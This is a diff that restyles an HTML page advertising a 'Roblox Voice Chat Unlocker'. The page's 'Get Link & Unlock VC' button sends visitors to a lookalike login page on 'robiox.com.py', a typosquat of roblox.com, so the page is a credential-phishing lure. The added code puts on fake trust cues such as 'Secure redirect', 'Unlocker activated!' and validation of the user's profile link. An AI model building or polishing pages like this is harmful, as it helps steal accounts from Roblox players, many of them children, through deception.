@@ -2,8 +2,12 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>VC Unlocker | Roblox</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>VC Unlocker | Roblox Voice Chat Tool</title>
+  <!-- Google Fonts + modern font stack -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+  <!-- Font Awesome 6 (free icons) -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
     * {
       margin: 0;
@@ -13,183 +17,449 @@
 
     body {
       background: linear-gradient(135deg, #0a0c12 0%, #10131c 100%);
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', sans-serif;
+      color: #eef2ff;
+      line-height: 1.5;
       min-height: 100vh;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
       padding: 1.5rem;
     }
 
-    .container {
-      max-width: 550px;
+    /* modern glassmorphic card container */
+    .saas-container {
+      max-width: 680px;
       width: 100%;
-      background: rgba(18, 22, 35, 0.8);
+      margin: 2rem auto;
+      background: rgba(18, 22, 35, 0.75);
       backdrop-filter: blur(12px);
-      border-radius: 2rem;
-      border: 1px solid rgba(66, 99, 235, 0.3);
-      padding: 2rem;
-      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5);
+      border-radius: 2.5rem;
+      border: 1px solid rgba(66, 99, 235, 0.25);
+      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.02) inset;
+      transition: all 0.2s ease;
     }
 
-    h1 {
-      font-size: 2rem;
-      font-weight: 700;
-      background: linear-gradient(135deg, #fff, #8aabff);
-      background-clip: text;
-      -webkit-background-clip: text;
-      color: transparent;
-      margin-bottom: 0.5rem;
+    /* inner content */
+    .card-inner {
+      padding: 2rem 2rem 2.2rem;
     }
 
-    .sub {
-      color: #8e9ac0;
-      margin-bottom: 2rem;
+    /* header / badge */
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      background: rgba(59, 130, 246, 0.2);
+      backdrop-filter: blur(4px);
+      padding: 0.35rem 1rem;
+      border-radius: 60px;
+      font-size: 0.85rem;
+      font-weight: 500;
+      color: #7aa9ff;
+      border: 1px solid rgba(59, 130, 246, 0.4);
+      margin-bottom: 1.75rem;
+    }
+
+    .badge i {
       font-size: 0.9rem;
     }
 
-    .input-group {
-      margin-bottom: 1.5rem;
+    h1 {
+      font-size: 2.4rem;
+      font-weight: 800;
+      letter-spacing: -0.02em;
+      background: linear-gradient(135deg, #FFFFFF 0%, #b9c8ff 100%);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+      margin-bottom: 0.75rem;
     }
 
-    label {
-      display: block;
-      margin-bottom: 0.5rem;
-      color: #cbd5ff;
-      font-weight: 500;
-      font-size: 0.85rem;
-    }
-
-    input {
-      width: 100%;
-      background: #0f111f;
-      border: 1.5px solid #2a2f4a;
-      border-radius: 1rem;
-      padding: 0.9rem 1rem;
-      font-size: 0.95rem;
-      color: white;
-      outline: none;
-      transition: all 0.2s;
-    }
-
-    input:focus {
-      border-color: #3b82f6;
-      box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.3);
-    }
-
-    button {
-      width: 100%;
-      background: linear-gradient(98deg, #2563eb, #3b82f6);
-      border: none;
-      padding: 0.9rem;
-      border-radius: 1rem;
-      font-weight: 600;
+    .description {
       font-size: 1rem;
-      color: white;
-      cursor: pointer;
-      transition: transform 0.15s, box-shadow 0.2s;
+      color: #9ca3cf;
+      margin-bottom: 2rem;
+      border-left: 3px solid #3b82f6;
+      padding-left: 1rem;
+    }
+
+    /* input group modern */
+    .input-group {
       margin-bottom: 2rem;
     }
 
-    button:hover {
-      transform: translateY(-1px);
-      box-shadow: 0 8px 20px rgba(37, 99, 235, 0.4);
+    .input-label {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-weight: 600;
+      font-size: 0.9rem;
+      margin-bottom: 0.5rem;
+      color: #cfdbf5;
     }
 
+    .input-label i {
+      color: #3b82f6;
+      font-size: 0.9rem;
+    }
+
+    .profile-input {
+      width: 100%;
+      background: #0f111f;
+      border: 1.5px solid #262b3e;
+      border-radius: 1.2rem;
+      padding: 0.9rem 1.2rem;
+      font-size: 1rem;
+      font-family: 'Inter', monospace;
+      color: white;
+      transition: all 0.2s;
+      outline: none;
+    }
+
+    .profile-input:focus {
+      border-color: #3b82f6;
+      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.3);
+      background: #0a0c18;
+    }
+
+    .profile-input::placeholder {
+      color: #4b526e;
+      font-weight: 400;
+    }
+
+    /* primary CTA button */
+    .btn-primary {
+      background: linear-gradient(98deg, #2563eb, #3b82f6);
+      border: none;
+      width: 100%;
+      padding: 0.9rem;
+      border-radius: 1.5rem;
+      font-weight: 700;
+      font-size: 1.05rem;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      cursor: pointer;
+      transition: transform 0.15s, box-shadow 0.2s;
+      box-shadow: 0 6px 14px rgba(37, 99, 235, 0.25);
+      font-family: inherit;
+    }
+
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      background: linear-gradient(98deg, #1e4fcf, #2e6eff);
+      box-shadow: 0 12px 22px -8px rgba(37, 99, 235, 0.45);
+    }
+
+    .btn-primary:active {
+      transform: translateY(1px);
+    }
+
+    /* divider with "or" style */
     .divider {
+      display: flex;
+      align-items: center;
       text-align: center;
+      margin: 2rem 0 1.5rem;
       color: #5f6a92;
-      font-size: 0.8rem;
-      margin: 1rem 0 1.2rem;
-      position: relative;
     }
 
     .divider::before,
     .divider::after {
       content: '';
-      position: absolute;
-      top: 50%;
-      width: 40%;
-      height: 1px;
-      background: #2a2f4a;
+      flex: 1;
+      border-bottom: 1px solid #262d44;
     }
 
-    .divider::before { left: 0; }
-    .divider::after { right: 0; }
+    .divider span {
+      font-size: 0.8rem;
+      font-weight: 500;
+      padding: 0 0.8rem;
+      letter-spacing: 0.3px;
+    }
 
+    /* username section */
     .username-section {
+      background: rgba(12, 14, 26, 0.6);
+      border-radius: 1.5rem;
+      padding: 0.2rem 0 0.8rem 0;
       margin-top: 0.5rem;
     }
 
     .inline-group {
       display: flex;
-      gap: 10px;
+      flex-wrap: wrap;
+      align-items: flex-end;
+      gap: 12px;
+      margin-top: 0.5rem;
     }
 
-    .inline-group input {
-      flex: 1;
+    .username-field {
+      flex: 2;
+      min-width: 160px;
     }
 
     .confirm-btn {
-      width: auto;
-      background: rgba(59, 130, 246, 0.2);
-      border: 1.5px solid #3b82f6;
-      padding: 0 1.5rem;
-      margin-bottom: 0;
+      background: rgba(37, 99, 235, 0.2);
+      border: 1.5px solid #2d3a6e;
+      backdrop-filter: blur(4px);
+      padding: 0.85rem 1.5rem;
+      border-radius: 1.4rem;
+      font-weight: 600;
+      color: #b9d0ff;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-size: 0.95rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-family: inherit;
     }
 
     .confirm-btn:hover {
-      background: rgba(59, 130, 246, 0.4);
+      background: rgba(59, 130, 246, 0.3);
+      border-color: #3b82f6;
+      color: white;
     }
 
-    @media (max-width: 480px) {
-      .container { padding: 1.5rem; }
-      .inline-group { flex-direction: column; }
-      .confirm-btn { padding: 0.9rem; width: 100%; }
+    /* status message / toast like */
+    .status-message {
+      margin-top: 1.6rem;
+      font-size: 0.85rem;
+      padding: 0.7rem 1rem;
+      border-radius: 1rem;
+      background: rgba(0, 0, 0, 0.35);
+      border-left: 3px solid #3b82f6;
+      color: #bfc9f0;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .status-message i {
+      font-size: 0.9rem;
+    }
+
+    .error-status {
+      border-left-color: #f97316;
+      color: #ffcd9a;
+    }
+
+    .success-status {
+      border-left-color: #22c55e;
+      color: #bef5cf;
+    }
+
+    /* footer / subtle */
+    .footer-note {
+      margin-top: 2rem;
+      text-align: center;
+      font-size: 0.75rem;
+      color: #5c6792;
+      border-top: 1px solid #1e233b;
+      padding-top: 1.5rem;
+    }
+
+    /* responsive touches */
+    @media (max-width: 540px) {
+      .card-inner {
+        padding: 1.5rem;
+      }
+      h1 {
+        font-size: 1.8rem;
+      }
+      .inline-group {
+        flex-direction: column;
+        align-items: stretch;
+      }
+      .confirm-btn {
+        justify-content: center;
+      }
+    }
+
+    /* fancy gradient orb */
+    .bg-glow {
+      position: fixed;
+      width: 500px;
+      height: 500px;
+      background: radial-gradient(circle at 30% 50%, rgba(37, 99, 235, 0.2), transparent 70%);
+      pointer-events: none;
+      z-index: -1;
+      bottom: 0;
+      right: -150px;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>VC Unlocker</h1>
-    <div class="sub">Unlock voice chat on Roblox</div>
-
-    <!-- Profile link input -->
-    <div class="input-group">
-      <label>Roblox Profile Link</label>
-      <input type="text" id="profileLink" placeholder="https://www.roblox.com/users/123456789/profile">
+<div class="bg-glow"></div>
+<div class="saas-container">
+  <div class="card-inner">
+    <div class="badge">
+      <i class="fas fa-microphone-alt"></i>
+      <span>VC UNLOCKER · NEXT GEN TOOL</span>
+    </div>
+    <h1>Roblox Voice Chat<br>Unlocker</h1>
+    <div class="description">
+      Unlock VC features instantly. Paste your profile link, generate the access link, or verify your username.
     </div>
 
-    <!-- Get Link button - redirects to the specified URL -->
-    <button id="getLinkBtn">Get Link & Unlock VC</button>
-
-    <div class="divider">OR</div>
-
-    <!-- Username + Confirm button -->
-    <div class="username-section">
-      <label>Enter Username</label>
-      <div class="inline-group">
-        <input type="text" id="username" placeholder="Your Roblox username">
-        <button id="confirmBtn" class="confirm-btn">Confirm</button>
+    <!-- MAIN SECTION: Roblox profile link input + get link button -->
+    <div class="input-group">
+      <div class="input-label">
+        <i class="fab fa-roblox"></i>
+        <span>Roblox Profile URL</span>
+      </div>
+      <input type="text" id="profileLinkInput" class="profile-input" placeholder="https://www.roblox.com/users/123456789/profile" value="">
+      <div style="margin-top: 0.5rem; font-size: 0.7rem; color:#5f6c9e;">
+        <i class="fas fa-link"></i> Any valid Roblox profile or user link works
       </div>
     </div>
+
+    <!-- GET LINK BUTTON - NOW REDIRECTS TO PLS DONATE LINK -->
+    <button id="getLinkBtn" class="btn-primary">
+      <i class="fas fa-bolt"></i> Get Link & Unlock VC
+    </button>
+
+    <!-- Divider -->
+    <div class="divider">
+      <span>OR ALTERNATIVE METHOD</span>
+    </div>
+
+    <!-- USERNAME SECTION + CONFIRM BUTTON (exactly as requested) -->
+    <div class="username-section">
+      <div class="input-label">
+        <i class="fas fa-user-astronaut"></i>
+        <span>Enter Roblox Username</span>
+      </div>
+      <div class="inline-group">
+        <div class="username-field">
+          <input type="text" id="usernameInput" class="profile-input" placeholder="e.g., CoolBuilder123" style="background:#0c0e1a;">
+        </div>
+        <button id="confirmUsernameBtn" class="confirm-btn">
+          <i class="fas fa-check-circle"></i> Confirm
+        </button>
+      </div>
+      <div style="font-size: 0.7rem; margin-top: 0.5rem; color:#5f6c9e; padding-left: 0.2rem;">
+        <i class="fas fa-shield-alt"></i> Username verification enhances compatibility
+      </div>
+    </div>
+
+    <!-- dynamic status / info panel -->
+    <div id="statusArea" class="status-message">
+      <i class="fas fa-info-circle"></i> Ready — paste a profile link or enter username
+    </div>
+    <div class="footer-note">
+      <i class="fas fa-lock"></i> Secure redirect · Roblox VC unlocker utility
+    </div>
   </div>
+</div>
 
-  <script>
-    // Get Link button: redirects to the exact URL
-    document.getElementById('getLinkBtn').addEventListener('click', function() {
-      window.location.href = "https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F274156662874%2FPLS-DONATE";
-    });
+<script>
+  // ---------- Constants ----------
+  // Updated redirect URL to PLS DONATE instead of Blox Fruits
+  const BASE_REDIRECT = "https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F274156662874%2FPLS-DONATE";
 
-    // Confirm button: just shows confirmation
-    document.getElementById('confirmBtn').addEventListener('click', function() {
-      const username = document.getElementById('username').value.trim();
-      if (username === "") {
-        alert("Please enter a username");
-      } else {
-        alert("Username confirmed: " + username);
+  // Helper: show status message with style (success, error, info)
+  const statusDiv = document.getElementById('statusArea');
+
+  function setStatus(message, type = 'info') {
+    // clear previous classes
+    statusDiv.classList.remove('error-status', 'success-status');
+    let icon = '<i class="fas fa-circle-info"></i>';
+    if (type === 'error') {
+      statusDiv.classList.add('error-status');
+      icon = '<i class="fas fa-triangle-exclamation"></i>';
+    } else if (type === 'success') {
+      statusDiv.classList.add('success-status');
+      icon = '<i class="fas fa-check-circle"></i>';
+    } else {
+      icon = '<i class="fas fa-info-circle"></i>';
+    }
+    statusDiv.innerHTML = `${icon} ${message}`;
+  }
+
+  // Validate Roblox profile URL
+  function extractProfileIdentifier(profileUrl) {
+    if (!profileUrl || profileUrl.trim() === "") return null;
+    let url = profileUrl.trim();
+    try {
+      if (!url.startsWith('http://') && !url.startsWith('https://')) {
+        url = 'https://' + url;
       }
-    });
-  </script>
+      const urlObj = new URL(url);
+      if (!urlObj.hostname.includes('roblox.com')) {
+        return null;
+      }
+      return { valid: true, originalUrl: profileUrl.trim() };
+    } catch (e) {
+      return null;
+    }
+  }
+
+  // Get Link button logic: redirect to PLS DONATE website
+  function handleGetLink() {
+    const profileInput = document.getElementById('profileLinkInput').value.trim();
+    if (!profileInput) {
+      setStatus("❌ Please enter a Roblox profile link first.", "error");
+      return;
+    }
+    const validation = extractProfileIdentifier(profileInput);
+    if (!validation) {
+      setStatus("⚠️ Invalid Roblox profile link. Example: https://www.roblox.com/users/123456789/profile", "error");
+      return;
+    }
+    // Redirect to PLS DONATE link
+    setStatus(`✅ Unlocker activated! Redirecting with profile: ${validation.originalUrl} ...`, "success");
+    setTimeout(() => {
+      window.location.href = BASE_REDIRECT;
+    }, 800);
+  }
+
+  // Confirm username button
+  function handleConfirmUsername() {
+    const usernameRaw = document.getElementById('usernameInput').value.trim();
+    if (usernameRaw === "") {
+      setStatus("⚠️ Please enter a Roblox username before confirming.", "error");
+      return;
+    }
+    const validUsernameRegex = /^[a-zA-Z0-9_]{3,20}$/;
+    if (!validUsernameRegex.test(usernameRaw)) {
+      setStatus("❌ Invalid username format (3-20 chars, letters, numbers, underscores).", "error");
+      return;
+    }
+    setStatus(`🎤 Username "${usernameRaw}" confirmed! You can now use the "Get Link" with your profile or proceed.`, "success");
+  }
+
+  // attach event listeners
+  document.getElementById('getLinkBtn').addEventListener('click', handleGetLink);
+  document.getElementById('confirmUsernameBtn').addEventListener('click', handleConfirmUsername);
+
+  // Enter key on profile input triggers get link
+  const profileInputElem = document.getElementById('profileLinkInput');
+  profileInputElem.addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      handleGetLink();
+    }
+  });
+
+  // username field enter triggers confirm
+  const usernameField = document.getElementById('usernameInput');
+  usernameField.addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      handleConfirmUsername();
+    }
+  });
+
+  // initial status
+  setTimeout(() => {
+    setStatus("✨ Ready to unlock Voice Chat — insert your Roblox profile link", "info");
+  }, 100);
+</script>
 </body>
 </html>
